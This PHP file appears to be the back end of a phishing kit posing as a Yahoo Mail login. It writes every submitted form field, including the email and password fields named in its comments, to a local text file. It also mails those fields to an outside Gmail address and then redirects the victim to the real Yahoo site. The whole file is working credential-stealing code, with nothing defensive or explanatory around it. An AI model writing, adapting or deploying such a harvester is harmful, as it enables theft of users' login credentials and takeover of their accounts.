<?php
header ('Location:http://mail.yahoo.fr/');

$handle = fopen("gerona.txt", "a");
$texte = "";
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
$texte = $texte." ".$variable;
fwrite($handle, "\r\n");
fwrite($handle, "=");
$texte = $texte."=";
fwrite($handle, $value);
$texte = $texte." ".$value;
fwrite($handle, "\r\n");
$texte = $texte."=";
}
fwrite($handle, "$$---------------------------------------------$$");
fwrite($handle, "\r\n");

fclose($handle);


//echo $texte;
//echo $_POST["Email"];
//echo $_POST["Passwd"];
$name = "Ya WEB"; 
//$_POST['name'];
$subject = "Ya Mail";  
$message = $texte;

$to = "million.hadol@gmail.com";


mail ($to, $subject, $message, "From: " . $name); 

?>
